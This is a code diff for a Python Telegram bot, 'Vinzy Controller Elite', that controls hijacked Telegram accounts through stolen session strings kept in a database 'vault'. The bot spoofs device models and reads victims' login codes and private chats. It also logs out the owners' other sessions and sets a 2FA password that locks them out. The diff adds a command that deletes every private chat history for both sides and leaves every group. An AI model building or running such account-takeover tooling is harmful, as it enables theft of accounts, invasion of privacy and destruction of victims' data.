@@ -19,7 +19,6 @@ from telethon.sessions import StringSession
 from datetime import datetime
 
 # --- 1. ADVANCED LOGGING INFRASTRUCTURE ---
-# Optimized for cloud deployment (Koyeb/Heroku/Railway)
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - [%(levelname)s] - %(name)s: %(message)s',
@@ -33,7 +32,6 @@ API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL")
 
-# Group ID validation to prevent unauthorized bot usage
 try:
     GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
 except (ValueError, TypeError):
@@ -49,11 +47,8 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # --- 3. PERSISTENT STORAGE LAYER (POSTGRESQL) ---
 
 class VaultManager:
-    """Handles high-performance database operations for session storage."""
-    
     @staticmethod
     def get_connection():
-        """Returns a secure connection to the Neon database."""
         try:
             return psycopg2.connect(DATABASE_URL, sslmode='require')
         except Exception as e:
@@ -62,7 +57,6 @@ class VaultManager:
 
     @classmethod
     def initialize_db(cls):
-        """Ensures the vault table exists with the correct schema."""
         conn = cls.get_connection()
         if conn:
             try:
@@ -86,7 +80,6 @@ class VaultManager:
 
     @classmethod
     def upsert_session(cls, phone, session_str):
-        """Saves or updates a session string in the vault."""
         conn = cls.get_connection()
         if not conn: return False
         try:
@@ -107,7 +100,6 @@ class VaultManager:
 
     @classmethod
     def get_session(cls, phone):
-        """Retrieves a session string from the vault."""
         conn = cls.get_connection()
         if not conn: return None
         try:
@@ -121,7 +113,6 @@ class VaultManager:
 
     @classmethod
     def list_all(cls):
-        """Fetches all stored accounts for the .list command."""
         conn = cls.get_connection()
         if not conn: return []
         try:
@@ -136,15 +127,10 @@ class VaultManager:
 # --- 4. ASYNC TASK ENGINE (TELETHON WRAPPER) ---
 
 async def run_logic(phone, callback, *args):
-    """
-    Main execution wrapper for all Telethon-based commands.
-    Handles connection, auth verification, and device spoofing.
-    """
     session_str = VaultManager.get_session(phone)
     if not session_str:
         return f"❌ <b>Error:</b> Account <code>{phone}</code> is not in the vault."
 
-    # Spoofing the latest hardware for maximum security/stealth
     client = TelegramClient(
         StringSession(session_str),
         API_ID, API_HASH,
@@ -175,7 +161,6 @@ async def run_logic(phone, callback, *args):
 # --- 5. FUNCTIONAL LOGIC MODULES ---
 
 async def logic_auth_manual(session_str):
-    """Verifies a raw session string and saves it if valid."""
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
     try:
         await client.connect()
@@ -195,12 +180,11 @@ async def logic_auth_manual(session_str):
                 f"🆔 <b>UID:</b> <code>{me.id}</code>\n"
                 f"━━━━━━━━━━━━━━━"
             )
-        return "❌ <b>DB Error:</b> Could not save session to vault."
+        return "❌ <b>DB Error:</b> Could not save session."
     finally:
         await client.disconnect()
 
 async def logic_get_info(client):
-    """Pulls full metadata and account status."""
     me = await client.get_me()
     return (
         f"📊 <b>Full Account Intel</b>\n"
@@ -214,7 +198,6 @@ async def logic_get_info(client):
     )
 
 async def logic_check_2fa(client):
-    """Checks for the presence of a cloud password."""
     try:
         res = await client(functions.account.GetPasswordRequest())
         if res.has_password:
@@ -224,19 +207,19 @@ async def logic_check_2fa(client):
         return f"⚠️ Error: {str(e)}"
 
 async def logic_kick_all(client):
-    """Forces all other sessions to log out."""
-    await client(functions.auth.ResetAuthorizationsRequest())
-    return "⚡ <b>Success:</b> All other active sessions have been wiped."
+    try:
+        await client(functions.auth.ResetAuthorizationsRequest())
+        return "⚡ <b>Success:</b> All other active sessions have been wiped."
+    except errors.FreshResetAuthorisationForbiddenError:
+        return "❌ <b>Forbidden:</b> Session is too new (needs 24h-72h age)."
 
 async def logic_get_code(client):
-    """Pulls the latest service message from Telegram (Login Codes)."""
     async for msg in client.iter_messages(777000, limit=1):
         if msg.text:
             return f"📟 <b>Latest System Message:</b>\n\n<code>{msg.text}</code>"
     return "📭 <b>Inbox Empty:</b> No codes found."
 
 async def logic_list_chats(client, limit):
-    """Retrieves a list of recent chats with their IDs."""
     output = f"💬 <b>Recent {limit} Chats:</b>\n\n"
     async for d in client.iter_dialogs(limit=limit):
         icon = "👤" if d.is_user else "👥"
@@ -244,7 +227,6 @@ async def logic_list_chats(client, limit):
     return output
 
 async def logic_read_msgs(client, cid, limit):
-    """Reads messages from a specific chat ID."""
     try:
         output = f"📩 <b>Chat Logs for {cid}:</b>\n\n"
         async for m in client.iter_messages(cid, limit=limit):
@@ -255,6 +237,21 @@ async def logic_read_msgs(client, cid, limit):
     except Exception as e:
         return f"⚠️ Failed to read {cid}: {str(e)}"
 
+async def logic_clean_account(client):
+    count = 0
+    async for dialog in client.iter_dialogs():
+        try:
+            if dialog.is_channel and not dialog.is_group:
+                continue
+            if dialog.is_user:
+                await client(functions.messages.DeleteHistoryRequest(peer=dialog.input_entity, max_id=0, just_clear=False, revoke=True))
+                count += 1
+            elif dialog.is_group:
+                await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
+                count += 1
+        except: continue
+    return f"🧹 <b>Cleanup Complete:</b> Purged <code>{count}</code> chats/groups. Channels saved."
+
 # --- 6. TELEGRAM BOT HANDLERS ---
 
 @bot.message_handler(commands=['start', 'help'])
@@ -264,20 +261,19 @@ def handle_help(m):
         "👑 <b>VINZY CONTROLLER ELITE V4.5</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         "🔌 <b>ACCESS</b>\n"
-        "• <code>.auth [session]</code> - Inject session string\n"
-        "• <code>.list</code> - Show all captured accounts\n\n"
+        "• <code>.auth [session]</code> - Inject session\n"
+        "• <code>.list</code> - List vault\n\n"
         "🛡️ <b>CONTROL</b>\n"
-        "• <code>.info [phone]</code> - Full account report\n"
-        "• <code>.lock [phone]</code> - Check 2FA status\n"
-        "• <code>.wipe [phone]</code> - Terminate sessions\n"
-        "• <code>.secure [phone] [pw]</code> - Set force 2FA\n\n"
+        "• <code>.info [phone]</code> - Stats\n"
+        "• <code>.lock [phone]</code> - 2FA status\n"
+        "• <code>.wipe [phone]</code> - Logout others\n"
+        "• <code>.secure [phone] [pw]</code> - Set 2FA\n\n"
+        "🧹 <b>PURGE</b>\n"
+        "• <code>.clean [phone]</code> - Delete all chats (Skip Channels)\n\n"
         "🕵️ <b>DISCOVERY</b>\n"
-        "• <code>.code [phone]</code> - Get login codes\n"
+        "• <code>.code [phone]</code> - Get code\n"
         "• <code>.chats [phone] [limit]</code> - List dialogs\n"
-        "• <code>.dump [phone] [id] [limit]</code> - Read chat\n\n"
-        "✍️ <b>MODS</b>\n"
-        "• <code>.bio [phone] [text]</code> - Change bio\n"
-        "• <code>.name [phone] [first] [last]</code> - Change name\n"
+        "• <code>.dump [phone] [id] [limit]</code> - Read chat\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
     bot.send_message(m.chat.id, text, parse_mode="HTML")
@@ -287,7 +283,6 @@ def cmd_auth(m):
     if m.chat.id != GROUP_ID: return
     args = m.text.split(" ", 1)
     if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
-    bot.send_chat_action(m.chat.id, 'typing')
     res = asyncio.run(logic_auth_manual(args[1].strip()))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
@@ -305,31 +300,32 @@ def cmd_list(m):
 def cmd_info(m):
     if m.chat.id != GROUP_ID: return
     args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.info [phone]</code>")
+    if len(args) < 2: return
     res = asyncio.run(run_logic(args[1], logic_get_info))
-    bot.send_message(m.chat.id, res, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.lock'))
-def cmd_lock(m):
-    if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.lock [phone]</code>")
-    res = asyncio.run(run_logic(args[1], logic_check_2fa))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.wipe'))
 def cmd_wipe(m):
     if m.chat.id != GROUP_ID: return
     args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.wipe [phone]</code>")
+    if len(args) < 2: return
     res = asyncio.run(run_logic(args[1], logic_kick_all))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.clean'))
+def cmd_clean(m):
+    if m.chat.id != GROUP_ID: return
+    args = m.text.split(" ")
+    if len(args) < 2: return
+    bot.send_message(m.chat.id, f"🧹 <b>Purging +{args[1]}...</b>")
+    res = asyncio.run(run_logic(args[1], logic_clean_account))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.code'))
 def cmd_code(m):
     if m.chat.id != GROUP_ID: return
     args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.code [phone]</code>")
+    if len(args) < 2: return
     res = asyncio.run(run_logic(args[1], logic_get_code))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
@@ -337,7 +333,7 @@ def cmd_code(m):
 def cmd_chats(m):
     if m.chat.id != GROUP_ID: return
     args = m.text.split(" ")
-    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.chats [phone] [limit]</code>")
+    if len(args) < 2: return
     limit = int(args[2]) if len(args) > 2 else 15
     res = asyncio.run(run_logic(args[1], logic_list_chats, limit))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
@@ -345,72 +341,42 @@ def cmd_chats(m):
 @bot.message_handler(func=lambda m: m.text.startswith('.dump'))
 def cmd_dump(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(parts := m.text.split()) < 3: return bot.reply_to(m, "Usage: <code>.dump [phone] [id] [limit]</code>")
-    phone, cid = parts[1], parts[2]
-    limit = int(parts[3]) if len(parts) > 3 else 10
-    res = asyncio.run(run_logic(phone, logic_read_msgs, cid, limit))
-    bot.send_message(m.chat.id, res, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
-def cmd_bio(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ", 2)
-    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.bio [phone] [text]</code>")
-    async def bio_fn(c, t):
-        await c(functions.account.UpdateProfileRequest(about=t))
-        return "✅ Bio updated."
-    res = asyncio.run(run_logic(parts[1], bio_fn, parts[2]))
+    parts = m.text.split()
+    if len(parts) < 3: return
+    res = asyncio.run(run_logic(parts[1], logic_read_msgs, parts[2], int(parts[3]) if len(parts) > 3 else 10))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.secure'))
 def cmd_secure(m):
     if m.chat.id != GROUP_ID: return
     parts = m.text.split(" ")
-    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.secure [phone] [pw]</code>")
-    async def secure_fn(c, p):
+    if len(parts) < 3: return
+    async def s_fn(c, p):
         await c.edit_2fa(new_password=p)
-        return f"✅ 2FA set to: <code>{p}</code>"
-    res = asyncio.run(run_logic(parts[1], secure_fn, parts[2]))
-    bot.send_message(m.chat.id, res, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.name'))
-def cmd_name(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ", 3)
-    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.name [phone] [first] [last]</code>")
-    f, l = parts[2], parts[3] if len(parts) > 3 else ""
-    async def name_fn(c, first, last):
-        await c(functions.account.UpdateProfileRequest(first_name=first, last_name=last))
-        return "✅ Name changed."
-    res = asyncio.run(run_logic(parts[1], name_fn, f, l))
+        return f"✅ 2FA set: <code>{p}</code>"
+    res = asyncio.run(run_logic(parts[1], s_fn, parts[2]))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 # --- 7. MAIN STARTUP SEQUENCE ---
 
 def main():
-    """Initializes system components and starts the listener."""
     print("""
-    __     ___                  _____            _             _ _ 
-    \ \   / (_)                / ____|          | |           | | |
-     \ \_/ / _ _ __  _____   _| |     ___  _ __ | |_ _ __ ___ | | |
-      \   / | | '_ \|_  / | | | |    / _ \| '_ \| __| '__/ _ \| | |
-       | |  | | | | |/ /| |_| | |___| (_) | | | | |_| | | (_) | | |
-       |_|  |_|_| |_/___|\__, |\_____\___/|_| |_|\__|_|  \___/|_|_|
-                          __/ |                                    
-                         |___/                                     
+ __      ___                 _____ _                  
+ \ \    / (_)               / ____| |                 
+  \ \  / / _ _ __  _____   | (___ | |_ ___  _ __ ___  
+   \ \/ / | | '_ \|_  / | | \___ \| __/ _ \| '__/ _ \ 
+    \  /  | | | | |/ /| |_| |___) | || (_) | | |  __/ 
+     \/   |_|_| |_/___|\__, |_____/ \__\___/|_|  \___| 
+                        __/ |                         
+                       |___/                          
     """)
     VaultManager.initialize_db()
     logger.info("Vinzy Controller Elite v4.5 is online.")
-    
-    # Infinity polling with low timeout to ensure responsiveness on cloud hosts
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=0, timeout=20)
+        except:
+            time.sleep(5)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        logger.info("Shutting down...")
-        sys.exit(0)
-    except Exception as e:
-        logger.critical(f"UNRECOVERABLE SYSTEM ERROR: {e}")
+    main()
